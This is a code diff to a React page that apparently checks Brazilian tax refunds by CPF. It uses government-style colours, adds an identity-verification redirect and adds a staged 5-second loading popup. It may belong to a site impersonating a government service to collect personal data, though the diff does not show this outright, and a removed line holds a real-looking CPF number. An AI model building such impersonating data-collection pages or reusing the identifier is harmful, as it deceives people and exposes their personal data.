@@ -15,6 +15,7 @@ import { useToast } from "@/hooks/use-toast";
 import { FaInfoCircle } from "react-icons/fa";
 import VerificacaoIdentidade from "../components/VerificacaoIdentidade";
 import ImageVerification from "../components/ImageVerification";
+import { LoadingPopup } from "../components/LoadingPopup";
 
 // Validação de CPF
 const cpfSchema = z.object({
@@ -37,6 +38,7 @@ export default function VerificarRestituicao() {
   const [showVerificacao, setShowVerificacao] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
   const [imageVerified, setImageVerified] = useState(false);
+  const [showLoading, setShowLoading] = useState(false);
   
   // Formulário de CPF
   const form = useForm<CpfFormType>({
@@ -109,14 +111,13 @@ export default function VerificarRestituicao() {
     const cpfLimpo = data.cpf.replace(/\D/g, "");
     setCpfConsultado(cpfLimpo);
     
-    // Só exibimos a verificação se não houver erro
-    if (cpfLimpo === "11548718785") {
-      // Para o CPF de teste, mostramos imediatamente
-      setShowVerificacao(true);
-    } else {
-      // Para outros CPFs, verificamos após a consulta
-      // A verificação será exibida quando os dados estiverem disponíveis
-    }
+    // Exibir o popup de carregamento
+    setShowLoading(true);
+    
+    // Aguardar 5 segundos e redirecionar para a página de confirmação
+    setTimeout(() => {
+      navigate(`/confirmar-identidade/${cpfLimpo}`);
+    }, 5000);
   };
 
   const { toast } = useToast();
@@ -190,10 +191,10 @@ export default function VerificarRestituicao() {
                         name="cpf"
                         render={({ field }) => (
                           <FormItem className="mb-4">
-                            <FormLabel className="block mb-1">
+                            <FormLabel className="flex items-center mb-1">
                               <span>CPF:</span>
                               <span className="required-star text-red-600 ml-1">*</span>
-                              <span className="ml-1 text-red-500">
+                              <span className="ml-1 text-red-500 flex items-center">
                                 <FaInfoCircle size={14} />
                               </span>
                             </FormLabel>
@@ -229,10 +230,11 @@ export default function VerificarRestituicao() {
                       <div className="text-center">
                         <Button 
                           type="submit" 
-                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold px-8 py-6 text-lg"
+                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                           disabled={isLoading || !imageVerified}
                         >
-                          {isLoading ? "Consultando..." : "Consultar CPF"}
+                          <i className="fas fa-arrow-right mr-2"></i>
+                          <span>{isLoading ? "Consultando..." : "Prosseguir"}</span>
                         </Button>
                       </div>
                       
